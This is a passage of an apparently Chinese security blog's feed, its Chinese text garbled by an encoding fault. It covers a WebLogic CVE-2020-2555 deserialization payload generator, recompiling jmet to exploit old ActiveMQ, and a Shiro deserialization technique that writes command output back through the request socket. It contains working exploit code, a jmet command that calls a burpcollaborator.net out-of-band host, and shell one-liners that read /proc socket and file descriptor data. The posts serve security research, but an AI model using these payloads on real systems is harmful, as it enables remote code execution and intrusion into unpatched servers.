Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(<span class="string">"m_oAnchorTop"</span>);</span><br><span class="line">        m_oAnchorTop.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        m_oAnchorTop.set(limitFilter, Runtime<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Field val = expException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(expException, limitFilter);</span><br><span class="line">        ser(expException, <span class="string">"./CVE_2020_2555_12013.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------åºåˆ—åŒ–æˆåŠŸ"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2020-2555çš„ä¿®å¤"><a href="#CVE-2020-2555çš„ä¿®å¤" class="headerlink" title="CVE-2020-2555çš„ä¿®å¤"></a>CVE-2020-2555çš„ä¿®å¤</h2><p>å›¾ç‰‡æ¥è‡ª<a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">ZDL</a>ï¼ˆä¾µåˆ ï¼‰å¯ä»¥çœ‹åˆ°æ˜¯åˆ äº†extractor.extract<br><img src="1585035027893-70b8222a-14ca-4001-84ce-471b16388b17.png" alt="image.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¢³ç†å®Œä¸€éä¹‹åï¼Œæˆ‘ä»¬å¾—ä»¥çœ‹åˆ°æ•´ä¸ªç»•è¿‡æ€è·¯çš„å…¨è²Œã€‚ç¬”è€…ä¸»è§‚åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µã€‚</p><ul><li>ç¬¬ä¸€é˜¶æ®µï¼ŒCVE-2016-0638å’ŒCVE-2016-3510ã€‚åˆ©ç”¨ååºåˆ—åŒ–æµç¨‹ä¸­æ–°newçš„åŸç”Ÿoisç»•è¿‡ï¼Œåªè¦æ‰¾åˆ°äº†read*ç³»åˆ—çš„ç‚¹å¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„çœ‹å‡ºæ¥ã€‚</li><li>ç¬¬äºŒé˜¶æ®µï¼Œcve-2017-3248åˆ°cve-2018-3191ã€‚åˆ©ç”¨jrmpã€jndiå¸¦å¤–rceï¼Œæ¼æ´ç‚¹æ²¡æœ‰åœ¨read*çš„ä»£ç ä¸Šä¸‹æ–‡ä¸­éœ€è¦å¤šè·Ÿå‡ æ­¥æœ‰ç‚¹â€œpopâ€çš„æ„Ÿè§‰äº†ã€‚</li><li>ç¬¬ä¸‰é˜¶æ®µï¼Œcve-2020-2555ï¼Œéœ€è¦å¯¹javaçš„ååºåˆ—åŒ–å‡ºç°è¿‡çŸ¥è¯†ç‚¹å¾ˆç†Ÿæ‚‰ï¼ˆjavaåŸç”Ÿç±»çš„è§¦å‘ç‚¹+weblogicç»„ä»¶ä¸­ç±»ä¼¼ccçš„å¥—è·¯ï¼‰ï¼Œæ®è¯´è¿™ä¸ªæ¼æ´çš„ä½œè€…ä¹ŸæŒ–äº†å¾ˆä¹…ã€‚</li></ul><p><strong>ç¢äºç¬”è€…æ°´å¹³ï¼Œè¡Œæ–‡å‡ºé”™åœ¨æ‰€éš¾å…ï¼Œå¦‚æœ‰é˜…è¯»æ­¤æ–‡çš„å¸ˆå‚…å‘ç°é”™è¯¯è¿˜è¯·ä¸åæŒ‡æ­£ã€‚</strong></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.anquanke.com/post/id/162782">ä»WebLogicçœ‹ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ä¸é˜²å¾¡</a><br><a href="https://www.jianshu.com/p/411e18ceaa55">Java åºåˆ—åŒ–ä¹‹ Externalizable</a><br><a href="https://seaii-blog.com/index.php/2019/12/29/92.html">Weblogicæ¼æ´è°ƒè¯•ç¬”è®°</a><br><a href="https://wooyun.js.org/drops/%E5%A6%82%E4%BD%95%E6%8E%A7%E5%88%B6%E5%BC%80%E6%94%BEHTTPS%E6%9C%8D%E5%8A%A1%E7%9A%84weblogic%E6%9C%8D%E5%8A%A1%E5%99%A8.html">å¦‚ä½•æ§åˆ¶å¼€æ”¾HTTPSæœåŠ¡çš„weblogicæœåŠ¡å™¨</a><br><a href="https://y4er.com/post/weblogic-cve-2016-0638/">Weblogic CVE-2016-0638 StreamMessageImplååºåˆ—åŒ–ç»•è¿‡åˆ†æ</a><br><a href="https://www.databaseusers.com/article/6108629/Patch+S8C2+is+mutually+exclusive+and+cannot+coexist+with+patch(es)%3A+ZLNA%2CEJUW">Patch S8C2 is mutually exclusive and cannot coexist with patch(es): ZLNA,EJUW</a><br><a href="https://xz.aliyun.com/t/2479">Weblogic JRMPååºåˆ—åŒ–æ¼æ´å›é¡¾</a><br><a href="https://www.anquanke.com/post/id/152164">CVE-2018-2893ï¼šOracle WebLogic Server è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æé¢„è­¦</a><br><a href="https://nosec.org/home/detail/4314.html">æ¼«è°ˆ Weblogic CVE-2020-2555</a><br><a href="https://paper.seebug.org/1141/">Oracle Coherence ååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆCVE-2020-2555ï¼‰</a></p>]]></content>
    
    <summary type="html">
    
      weblogicå†å²T3ååºåˆ—åŒ–æ¼æ´åŠè¡¥ä¸æ¢³ç†
    
    </summary>
    
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>é‡æ–°ç¼–è¯‘jmetå°è®°</title>
    <link href="https://cl0und.github.io/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/"/>
    <id>https://cl0und.github.io/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/</id>
    <published>2020-03-21T11:46:24.000Z</published>
    <updated>2020-07-11T07:59:43.967Z</updated>
    
    <content type="html"><![CDATA[<!-- åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°å†…ç½‘æœ‰ä¸€äº›activemqç‰ˆæœ¬å¾ˆè€å®˜ç½‘çš„jmetæ‰“ä¸äº†éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè¸©äº†ä¸€äº›å‘ã€‚ --><!-- more --><p>åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°å†…ç½‘æœ‰ä¸€äº›activemqç‰ˆæœ¬å¾ˆè€ï¼ˆ2010å¹´å‰çš„ï¼‰ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰/fileserverè¿™ä¸ªè·¯å¾„æ„å‘³ç€æ²¡æ³•ç”¨<strong>CVE-2016-3088ï¼ˆçŒœæµ‹ç»è¿‡åŠ å›ºï¼‰ï¼Œ</strong>ä¸è¿‡å¹¸è¿çš„æ˜¯/adminæ²¡æœ‰æˆæƒå°±èƒ½è®¿é—®æ„å‘³ç€æœ‰ä¸»åŠ¨è§¦å‘CVE-2015-5254çš„å¯èƒ½æ€§ï¼ŒçŒœæµ‹è¿™ç§åé—¨çš„javaæ´å¯èƒ½è¢«åŠ å›ºäººå‘˜å¿½ç•¥ï¼Œæ‰€ä»¥æŠ„èµ·<a href="https://github.com/matthiaskaiser/jmet">jmet</a>è¯•äº†ä¸€ä¸‹ã€‚å›æ˜¾å¦‚ä¸‹<br><img src="1584789659269-eb4f1985-8c8f-4eae-88b5-cb4d8218eeb6.png#align=left&display=inline&height=138&name=image.png&originHeight=276&originWidth=1490&size=297008&status=done&style=none&width=745" alt="image.png"></p><p>çœ‹æ ·å­æ˜¯å¤±è´¥äº†ï¼Œç»è¿‡ä¸€ç•ªè°·æ­Œè¿‡åçœ‹åˆ°githubä¸Šæœ‰å¦‚ä¸‹å›ç­”ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºactivemqæ‰€ä¾èµ–çš„åŒ…ç‰ˆæœ¬è¿‡è€è€Œjmetä¾èµ–çš„åŒ…æ¯”è¾ƒæ–°æ‰€ä»¥æ‰“ä¸æˆåŠŸã€‚<br><img src="1583215074318-58d2e7e5-d8c1-42a2-bf8d-cca000abff11.png#align=left&display=inline&height=125&name=image.png&originHeight=250&originWidth=2076&size=224257&status=done&style=none&width=1038" alt="image.png"><br><img src="1583215080926-c3b83bc4-a741-487e-aea7-014ae6e5c411.png#align=left&display=inline&height=139&name=image.png&originHeight=278&originWidth=1568&size=121245&status=done&style=none&width=784" alt="image.png"></p><p>æ­£å¦‚githubä¸Šè¿™ä¸ªè€å¤–æ‰€è¯´éœ€è¦åŠ å…¥legacyã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;activemq-openwire-legacy&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;5.15.11&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶é—®é¢˜é—®é¢˜å‡ºåœ¨ä¾èµ–ä¸Šå°±æ„å‘³ç€è¦é‡æ–°ç¼–è¯‘ï¼Œè¸©äº†ä¸€äº›å‘ä¸‹é¢è®°å½•ä¸€ä¸‹ã€‚</p><p>jmetå¯ä»¥æ”»å‡»å¤šç§è½¯ä»¶ï¼Œæœ‰ä¸€äº›æ˜¯å•†ä¸šçš„è½¯ä»¶æˆ‘ä»¬æä¸åˆ°å¯¹åº”çš„jarï¼Œæ‰€ä»¥åˆ é™¤ä¸‹é¢ä¸¤ä¸ªjavaã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.java</span><br><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java</span><br></pre></td></tr></table></figure><p>å¦å¤–æ³¨æ„åˆ°jmetæ˜¯ä¾èµ–äºysoserial<br><img src="1584790845997-06ed872f-c5d6-4f4d-b6c4-a8ccc65de4d6.png#align=left&display=inline&height=201&name=image.png&originHeight=200&originWidth=742&size=25701&status=done&style=none&width=746" alt="image.png"></p><p>å¹¶ä¸”æˆ‘ä»¬åç»­ä¹Ÿä¼šç”¨åˆ°ï¼Œå¥ˆä½•æ²¡æ‰¾åˆ°ä»€ä¹ˆä¸­å¤®ä»“åº“æä¾›è¿™ç§é»‘å®¢ä¾èµ–ã€‚æ— å¥ˆéœ€è¦è‡ªå·±åˆ°å¯¼å…¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=<span class="number">0.0</span><span class="number">.5</span>-SNAPSHOT -Dpackaging=jar -Dfile=</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export MAVEN_OPTS=-Xss10m</span><br><span class="line">mvn clean compile assembly:single</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å¿«ä¹çš„ä¸€é”®getshelläº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains java -jar jmet<span class="number">-0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"ping -n 1 wyyekrec31qzxtpc4kq636jbi2otci.burpcollaborator.net"</span> -Yp ROME  ip port</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      åœ¨ä¸€æ¬¡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå‘ç°å†…ç½‘æœ‰ä¸€äº›activemqç‰ˆæœ¬å¾ˆè€å®˜ç½‘çš„jmetæ‰“ä¸äº†éœ€è¦é‡æ–°ç¼–è¯‘ï¼Œè¸©äº†ä¸€äº›å‘ã€‚
    
    </summary>
    
    
    
      <category term="java" scheme="https://cl0und.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>linuxä¸‹javaååºåˆ—åŒ–é€šæ€å›æ˜¾æ–¹æ³•çš„ä½é…ç‰ˆå®ç°</title>
    <link href="https://cl0und.github.io/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/"/>
    <id>https://cl0und.github.io/2020/02/24/linux%E4%B8%8Bjava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80%E5%9B%9E%E6%98%BE%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%8E%E9%85%8D%E7%89%88%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-02-24T11:34:22.000Z</published>
    <updated>2020-07-11T08:03:22.977Z</updated>
    
    <content type="html"><![CDATA[<!-- å…¶å®è¿™ä¸ªæ€è·¯è·ç¦»å®ç°æ ‡é…ç‰ˆçš„æ•ˆæœå°±ä¸€æ­¥ä¹‹é¥äº†ï½ --><!-- more --><p><a href="https://xz.aliyun.com/t/7307">é¦–å‘äºå…ˆçŸ¥è½¬è½½åˆ°è‡ªå·±åšå®¢</a></p><h2 id="æ•…äº‹çš„èµ·å› "><a href="#æ•…äº‹çš„èµ·å› " class="headerlink" title="æ•…äº‹çš„èµ·å› "></a>æ•…äº‹çš„èµ·å› </h2><p>ä¸€ç›´è§‰å¾—shiroååºåˆ—åŒ–æ˜¯ä¸€ä¸ªå¾ˆèˆ’æœçš„æ´ï¼ŒpayloadåŸç”ŸåŠ å¯†ï¼ˆæ— ç‰¹å¾ï¼‰ï¼Œå®æˆ˜ä¸­æœ‰æ¦‚ç‡é‡è§å¹¶ä¸”åˆæ˜¯javaååºåˆ—åŒ–æ´æ‰€ä»¥å±å®³åˆå¾ˆå¤§ã€‚ä¸è¿‡å°½ç®¡è¿™æ ·shiroæ‰“èµ·æ¥ä¾ç„¶æœ‰javaååºåˆ—åŒ–çš„ä¸¤ä¸ªç—›ç‚¹ã€‚ç¬¬ä¸€æ˜¯å¯ç”¨çš„gadgetï¼Œç¬¬äºŒä¸ªå¸¦å†…å›æ˜¾çš„é—®é¢˜ã€‚ä¸è¿‡æŸå¤©åœ¨åˆ·twçš„æ—¶å€™å‘ç°ç¬¬äºŒä¸ªç—›ç‚¹å›½å†…å·²ç»æœ‰å¤§ä½¬æœ‰æˆç†Ÿè§£å†³æ–¹æ¡ˆäº†ã€‚<br><img src="1582539071748-2900a239-4915-465f-9d8a-849a2a102b53.png#align=left&display=inline&height=728&name=image.png&originHeight=1160&originWidth=1188&size=1236427&status=done&style=none&width=746" alt="image.png"></p><p>æ³¨æ„çœ‹å›¾ï¼Œshiroçš„å›æ˜¾å¹¶ä¸åœ¨httpå“åº”åŒ…ä¸­è€Œæ˜¯åœ¨httpå“åº”åŒ…ä¹‹å‰ï¼Œå¾ˆç„å­¦çš„å›æ˜¾å¯¹å§ï¼Ÿè”æƒ³æœ€è¿‘åœ¨çœ‹äº†ä¸€ç¯‡æ–‡ç« <a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">é€šæ€æ¼æ´åˆ©ç”¨å›æ˜¾æ–¹æ³•-linuxå¹³å°</a>ï¼ŒæŒ‰æˆ‘çš„ç†è§£è¿™ç¯‡æ–‡ç« çš„æ€è·¯å¤§è‡´æ˜¯é€šè¿‡javaååºåˆ—åŒ–æ‰§è¡Œä»£ç &amp;&amp;ç³»ç»Ÿå‘½ä»¤è·å–åˆ°å‘èµ·è¿™æ¬¡è¯·æ±‚æ—¶æœåŠ¡ç«¯socketçš„æ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶ååœ¨æ–‡ä»¶æè¿°ç¬¦å†™å…¥å›æ˜¾å†…å®¹ã€‚ä¸Šå›¾çš„å›æ˜¾æ•ˆæœå’Œè¿™ç§æ€è·¯éå¸¸ç›¸ä¼¼ã€‚</p><h2 id="æŠ€æœ¯çš„éš¾ç‚¹"><a href="#æŠ€æœ¯çš„éš¾ç‚¹" class="headerlink" title="æŠ€æœ¯çš„éš¾ç‚¹"></a>æŠ€æœ¯çš„éš¾ç‚¹</h2><p>å®ç°è¿™ç§æŠ€æœ¯çš„éš¾ç‚¹åœ¨äºå¦‚ä½•é€šè¿‡javaååºåˆ—åŒ–æ‰§è¡Œä»£ç &amp;&amp;ç³»ç»Ÿå‘½ä»¤è·å–æœ¬æ¬¡httpè¯·æ±‚ç”¨åˆ°socketçš„æ–‡ä»¶æè¿°ç¬¦ã€‚å› ä¸ºåœ¨æœåŠ¡å™¨å¯¹å¤–å¼€æ”¾çš„æ—¶ä¼šæœ‰fdä¸‹ä¼šæœ‰è®¸å¤šsocketæè¿°ç¬¦ã€‚<br><img src="1582540730651-655c7e72-52c8-485d-b9f0-4cb038a724cb.png#align=left&display=inline&height=456&name=image.png&originHeight=690&originWidth=1130&size=173102&status=done&style=none&width=746" alt="image.png"><br>è¿™é‡Œç»™å‡ºè·å–socketæ–‡ä»¶æè¿°ç¬¦æˆ‘çš„ä¸€ä¸ªä½é…ç‰ˆæ€è·¯åŠå®ç°ï¼Œè‡³äºä¸ºå•¥æ˜¯ä½é…ç‰ˆä¼šåœ¨æ–‡ç« æœ€åæåˆ°ã€‚é¦–å…ˆæ³¨æ„åˆ°socketåé¢çš„æ•°å­—ä¸åŒï¼Œè¿™ä¸ªæ•°å­—å®é™…ä¸Šæ˜¯inodeå·ã€‚è¿™ä¸ªinodeå·ä¹Ÿå‡ºç°åœ¨/proc/net/tcpä¸­ã€‚<br><img src="1582540888379-0c087050-f90a-4881-8297-a465b7e28646.png#align=left&display=inline&height=135&name=image.png&originHeight=270&originWidth=2294&size=57686&status=done&style=none&width=1147" alt="image.png"><br>æ³¨æ„åˆ°æ¯ä¸€ä¸ªinodeå·å¯¹åº”å”¯ä¸€æ¡tcpè¿æ¥ä¿¡æ¯å¹¶ä¸”è¿™æ¡ä¿¡æ¯ä¸­çš„remote_addressé¡¹è®°å½•äº†è¿œç¨‹è¿æ¥çš„ipå’Œç«¯å£å·ã€‚è¯´åˆ°è¿™é‡Œå…¶å®è·å–socketæ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼šé€šè¿‡æŒ‡å®šå®¢æˆ·ç«¯å‘èµ·è¯·æ±‚çš„æºç«¯å£å·ï¼Œé€šè¿‡cat grep awkç»„åˆå¤§æ³•åœ¨tcpè¡¨ä¸­æ‹¿åˆ°inodeï¼ŒæŠŠæ‹¿åˆ°çš„inodeå·å†å»fdç›®å½•ä¸‹å†ç”¨cat grep wakå¤§æ³•æ‹¿åˆ°æ–‡ä»¶æè¿°ç¬¦çš„æ•°å­—ï¼Œå†è°ƒç”¨javaä»£ç æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦å³å¯å®ç°å¸¦å†…å›æ˜¾ã€‚</p><h2 id="å®ç°ç»†èŠ‚"><a href="#å®ç°ç»†èŠ‚" class="headerlink" title="å®ç°ç»†èŠ‚"></a>å®ç°ç»†èŠ‚</h2><h3 id="æŒ‡å®šç«¯å£å·"><a href="#æŒ‡å®šç«¯å£å·" class="headerlink" title="æŒ‡å®šç«¯å£å·"></a>æŒ‡å®šç«¯å£å·</h3><p>requestsåº“å¯ä»¥é‡æ–°å®ç°Httpè¾¾åˆ°æŒ‡å®šè¯·æ±‚ç«¯å£çš„ç›®çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class SourcePortAdapter(HTTPAdapter):</span><br><span class="line">    <span class="string">""</span><span class="string">""</span>Transport adapter<span class="string">" that allows us to set the source port."</span><span class="string">""</span></span><br><span class="line">    <span class="function">def <span class="title">__init__</span><span class="params">(self, port, *args, **kwargs)</span>:</span></span><br><span class="line"><span class="function">        self._source_port </span>= port</span><br><span class="line">        <span class="keyword">super</span>(SourcePortAdapter, self).__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function">def <span class="title">init_poolmanager</span><span class="params">(self, connections, maxsize, block=False)</span>:</span></span><br><span class="line"><span class="function">        self.poolmanager </span>= PoolManager(</span><br><span class="line">            num_pools=connections, maxsize=maxsize,</span><br><span class="line">            block=block, source_address=(<span class="string">''</span>, self._source_port))</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(target, SourcePortAdapter(randNum))</span><br><span class="line">resp = s.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">5</span>, headers=headers, verify=False)</span><br></pre></td></tr></table></figure><h3 id="è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦"><a href="#è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦"></a>è·å–socketå¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦</h3><p>æ•´ä¸ªæµç¨‹ä½¿ç”¨çš„å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=`cat /proc/$PPID/net/tcp6|awk <span class="string">'&#123;if($10&gt;0)print&#125;'</span>|grep -i %s|awk <span class="string">'&#123;print $10&#125;'</span>`;</span><br><span class="line">b=`ls -l /proc/$PPID/fd|grep $a|awk <span class="string">'&#123;print $9&#125;'</span>`;</span><br><span class="line">echo -n $b</span><br></pre></td></tr></table></figure><h3 id="å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®"><a href="#å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®" class="headerlink" title="å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®"></a>å¾€æ–‡ä»¶æè¿°ä¸­å†™æ•°æ®</h3><p>ç°åœ¨å‡è®¾shiroå­˜åœ¨ååºåˆ—åŒ–å¹¶ä¸”æ‰€ç”¨gadgetçš„æœ«ç«¯æ˜¯èµ°çš„TemplatesImplï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠysoserialä¸­çš„ç¡¬ç¼–ç çš„å‘½ä»¤æ‰§è¡Œæ”¹æˆä¸‹é¢è¿™æ ·çš„ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">String[] cmd = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"a=`cat /proc/$PPID/net/tcp6|awk '&#123;if($10&gt;0)print&#125;'|grep -i %s|awk '&#123;print $10&#125;'`;b=`ls -l /proc/$PPID/fd|grep $a|awk '&#123;print $9&#125;'`;echo -n $b"</span>&#125;;</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">java.io.InputStreamReader isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">java.io.BufferedReader br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">String line;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num = Integer.valueOf(stringBuilder.toString()).intValue();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>,<span class="string">"-c"</span>,<span class="string">"ifconfig"</span>&#125;;</span><br><span class="line"></span><br><span class="line">in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">isr  = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">br = <span class="keyword">new</span> java.io.BufferedReader(isr);</span><br><span class="line">stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    stringBuilder.append(line);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String ret = stringBuilder.toString();</span><br><span class="line">java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]&#123;Integer.TYPE&#125;);</span><br><span class="line">c.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.io.FileOutputStream os = <span class="keyword">new</span> java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> Integer(num)&#125;));</span><br><span class="line">os.write(ret.getBytes());</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™ç§ä½é…ç‰ˆæŒ‡ä»¤ifconfigåæ•ˆæœå®ç°æ•ˆæœå¦‚ä¸‹ï¼ŒæœåŠ¡ç«¯ä¼šç›´æ¥è¿”å›æ•°æ®å¹¶æ–­æ‰è¿æ¥ï¼Œæ‰€ä»¥æ²¡æœ‰äº†åé¢httpå“åº”åŒ…ï¼Œrequestsåº“æ— æ³•è¯†åˆ«è¿”å›çš„å†…å®¹æŠ¥é”™ã€‚<br><img src="1582541605629-07be9057-523f-47f1-aa13-3f1bc0369811.png#align=left&display=inline&height=259&name=image.png&originHeight=518&originWidth=3122&size=599181&status=done&style=none&width=1561" alt="image.png"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li>æˆ‘è¿™ç§æ–¹æ³•å› ä¸ºéœ€è¦ä¿è¯è¯·æ±‚æºç«¯å£ï¼Œæ‰€ä»¥æ²¡åŠæ³•æŒ‰ç…§å›¾ä¸­å¸ˆå‚…å®ç°çš„ä¸€æ ·åœ¨burpä¸­ï¼ˆburpä»£ç†åå‘èµ·è¯·æ±‚çš„ç«¯å£ä¸å¯æ§ï¼‰ã€‚åŒæ ·çš„é“ç†å¦‚æœè„†å¼±çš„shiroåº”ç”¨åœ¨åä»£åé¢ï¼Œå› ä¸ºåä»£çš„æºç«¯å£ä¸å¯é¢„æµ‹æ‰€ä»¥æ²¡åŠæ³•ç”¨è¿™ç§ä½é…ç‰ˆæ–¹æ¡ˆæ‹¿åˆ°å›æ˜¾ã€‚ä½†å®é™…æƒ…å†µä¸å‡ºç½‘çš„shiroè‚¯å®šæ˜¯åœ¨å†…ç½‘é‡Œé¢çš„ï¼Œæ‰€ä»¥ä»è¿™è§’åº¦æƒ³æƒ³è¿˜æœ‰ç‚¹é¸¡è‚‹ï¼Œå°±å½“æŠ›ç –å¼•ç‰äº†ï½</li><li>åœ¨ä¸Šé¢å¼•ç”¨çš„æ–‡ç« ä¸­æåˆ°äº† â€œjvmæ‰€æœ‰çš„å¯¹è±¡éƒ½å­˜å‚¨åœ¨å †å†…å­˜ä¸­ï¼Œä¹Ÿè®¸å¯ä»¥é€šè¿‡æŸç§æ–¹æ³•ç›´æ¥è·å–å­˜å‚¨åœ¨å 